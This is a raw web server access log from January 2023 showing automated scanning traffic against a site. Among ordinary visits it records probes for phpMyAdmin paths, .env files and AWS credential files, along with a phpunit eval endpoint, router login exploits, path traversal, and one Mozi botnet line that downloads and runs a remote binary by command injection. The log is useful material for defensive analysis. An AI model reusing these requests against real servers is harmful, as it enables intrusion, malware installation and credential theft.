47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /administrator/db/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:51 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:52 -0600] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:57 -0600] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:57 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:57 -0600] "GET /admin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:58 -0600] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:58 -0600] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:58 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
143.110.222.166 - - [15/Jan/2023:21:02:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
146.70.128.237 - - [15/Jan/2023:21:14:27 -0600] "POST /?p=1 HTTP/1.1" 301 236 "http://http://fell.net.top-product.top/" "Mozilla/4.0 +(http://chat-online.top/)"
154.113.120.42 - - [15/Jan/2023:21:36:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
179.43.177.242 - - [15/Jan/2023:21:41:14 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
45.79.181.104 - - [15/Jan/2023:21:44:05 -0600] "\x16\x03\x01" 400 226 "-" "-"
109.232.106.7 - - [15/Jan/2023:21:48:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
205.185.118.237 - - [15/Jan/2023:21:56:14 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [15/Jan/2023:22:06:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
4.17.224.131 - - [15/Jan/2023:22:09:46 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.17.224.131 - - [15/Jan/2023:22:09:47 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.180.49.233 - - [15/Jan/2023:22:48:36 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
194.180.49.233 - - [15/Jan/2023:22:48:42 -0600] "GET ../../proc/ HTTP" 400 226 "-" "-"
92.118.39.29 - - [15/Jan/2023:22:52:37 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [15/Jan/2023:23:11:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [15/Jan/2023:23:23:49 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:23:23:51 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2001:470:1:c84::22d - - [15/Jan/2023:23:43:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
2001:470:1:c84::23d - - [15/Jan/2023:23:46:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
2001:470:1:c84::222 - - [15/Jan/2023:23:46:54 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"
187.102.222.5 - - [15/Jan/2023:23:54:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:00:07:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [16/Jan/2023:00:48:22 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
128.199.77.96 - - [16/Jan/2023:01:07:56 -0600] "GET / HTTP/1.0" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
143.110.222.166 - - [16/Jan/2023:01:12:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
71.6.232.27 - - [16/Jan/2023:01:16:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
80.94.92.57 - - [16/Jan/2023:01:34:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.87.145.32 - - [16/Jan/2023:01:45:08 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:01:46:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
113.142.141.105 - - [16/Jan/2023:01:58:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [16/Jan/2023:02:07:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [16/Jan/2023:02:25:35 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:02:25:36 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.227.160 - - [16/Jan/2023:02:32:34 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.227.160 - - [16/Jan/2023:02:32:35 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.227.160 - - [16/Jan/2023:02:32:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:03:06:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [16/Jan/2023:03:44:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
60.217.75.70 - - [16/Jan/2023:03:59:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0"
143.110.222.166 - - [16/Jan/2023:04:07:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [16/Jan/2023:04:39:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.12.253.180 - - [16/Jan/2023:04:42:50 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [16/Jan/2023:04:42:56 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
143.110.222.166 - - [16/Jan/2023:05:06:08 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
34.78.6.216 - - [16/Jan/2023:05:12:36 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
205.185.118.237 - - [16/Jan/2023:05:19:07 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.223 - - [16/Jan/2023:05:24:46 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:05:24:47 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:05:37:29 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
159.65.111.248 - - [16/Jan/2023:05:41:03 -0600] "GET / HTTP/1.0" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
179.43.177.242 - - [16/Jan/2023:06:03:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [16/Jan/2023:06:03:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
60.217.75.70 - - [16/Jan/2023:06:30:43 -0600] "\x16\x03\x01" 400 226 "-" "-"
193.35.18.107 - - [16/Jan/2023:06:32:52 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
80.94.92.57 - - [16/Jan/2023:06:39:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.239.84.90 - - [16/Jan/2023:06:45:44 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [16/Jan/2023:07:03:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
187.110.208.54 - - [16/Jan/2023:07:06:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
31.220.1.83 - - [16/Jan/2023:07:09:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
189.85.40.235 - - [16/Jan/2023:07:37:15 -0600] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
92.118.39.29 - - [16/Jan/2023:07:41:46 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
154.89.5.69 - - [16/Jan/2023:08:08:57 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [16/Jan/2023:08:14:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [16/Jan/2023:08:25:25 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:08:25:26 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:08:57:49 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:09:12:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
104.207.254.7 - - [16/Jan/2023:09:23:04 -0600] "GET /style.php?sig=rename HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
104.207.254.7 - - [16/Jan/2023:09:23:04 -0600] "GET /wp-admin/style.php?sig=rename HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36"
152.89.196.211 - - [16/Jan/2023:09:28:47 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:09:44:17 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.62.197.36 - - [16/Jan/2023:09:55:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0"
64.62.197.33 - - [16/Jan/2023:09:57:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
64.62.197.40 - - [16/Jan/2023:09:58:11 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:10:09:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
5.148.11.122 - - [16/Jan/2023:10:12:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
143.110.241.236 - - [16/Jan/2023:10:18:32 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
88.0.10.62 - - [16/Jan/2023:10:22:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:10:33:03 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.240.47.12 - - [16/Jan/2023:10:34:11 -0600] "-" 408 - "-" "-"
179.43.177.242 - - [16/Jan/2023:10:46:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
109.237.97.180 - - [16/Jan/2023:11:06:36 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:36 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [16/Jan/2023:11:06:36 -0600] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:37 -0600] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:38 -0600] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:38 -0600] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:38 -0600] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "GET /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "POST /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:39 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:40 -0600] "POST /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
